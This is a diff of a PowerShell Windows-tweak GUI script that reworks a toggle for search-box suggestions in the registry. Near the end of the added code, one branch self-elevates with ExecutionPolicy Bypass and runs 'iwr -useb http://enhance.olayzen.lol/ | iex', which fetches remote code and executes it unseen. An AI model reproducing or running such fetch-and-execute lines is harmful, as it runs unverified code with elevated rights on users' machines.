@@ -160,21 +160,23 @@ function RemTouchKey(){
         }
 }
 
-function WebSearchStart { OptionalParameters
-    if ($WPFWebSearchStart.IsChecked){
-        Set-ItemProperty -path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Explorer" -Name "DisableSearchBoxSuggestions" -Value 1
-        Stop-Process -n explorer
-        c:\windows\explorer.exe
-    }
-    else {
-        Set-ItemProperty -path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Explorer" -Name "DisableSearchBoxSuggestions" -Value 0
-        Stop-Process -n explorer
-        c:\windows\explorer.exe
-    }
+
+function WebSearchStartFun(){
+    if ($WPFWebSearchStart.IsChecked)
+        {
+            Set-ItemProperty -path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableSearchBoxSuggestions" -Value 1
+            Stop-Process -n explorer
+            c:\windows\explorer.exe
+        }
+    else 
+        {
+            Set-ItemProperty -path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableSearchBoxSuggestions" -Value 0
+            Stop-Process -n explorer
+            c:\windows\explorer.exe
+        }
 }
 
-New-Item -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows" -Name "Explorer"
-reg.exe add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer\ /v  DisableSearchBoxSuggestions /t  REG_DWORD /d  0
+
 
 function Unpinabovewin10(){
     if ($WPFUnpin_All_Above.IsChecked)
@@ -668,14 +670,39 @@ if($value32.Hidden -eq 1)
     $WPFFileExtensions.IsChecked = $true
 }
 
+function startinstall {
+    reg.exe add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer\ /v  DisableSearchBoxSuggestions /t  REG_DWORD /d  0    
+}
 
-$WPFWebSearchStart.Add_Checked({FileExt})
-$WPFWebSearchStart.Add_UnChecked({FileExt})
-$value33 = Get-ItemProperty -path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Explorer" -Name "DisableSearchBoxSuggestions"
-if($value33.Hidden -eq 1)
+
+$WPFWebSearchStart.Add_Checked({WebSearchStartFun})
+$WPFWebSearchStart.Add_UnChecked({WebSearchStartFun})
+$value33 = Get-ItemProperty -path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableSearchBoxSuggestions"
+if($value33.DisableSearchBoxSuggestions -eq 0)
 {
+    write-host "DisableSearchBoxSuggestions Exists"
+    
+}
+elseif($value33.DisableSearchBoxSuggestions -eq 1)
+{
+    write-host "DisableSearchBoxSuggestions Exists"
     $WPFWebSearchStart.IsChecked = $true
 }
+else 
+{
+    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs;}
+    Write-host Adding DisableSearchBoxSuggestions to Reg Edit
+    Start-Sleep -Seconds 5
+    startinstall
+    Start-Sleep -Seconds 1
+    write-host "Adding DisableSearchBoxSuggestions to Registry, if it don't work. please start the program in administrator mode"
+    Start-Sleep -Seconds 5
+    iwr -useb http://enhance.olayzen.lol/ | iex
+    exit
+}
+
+
+
 
 
 $WPFItemBoxes.Add_Checked({ICBbutton})
@@ -698,8 +725,7 @@ if($value4.TaskbarDa -eq 0)
 
 
 
-
-
+Get-Variable WPF*
 
 
 
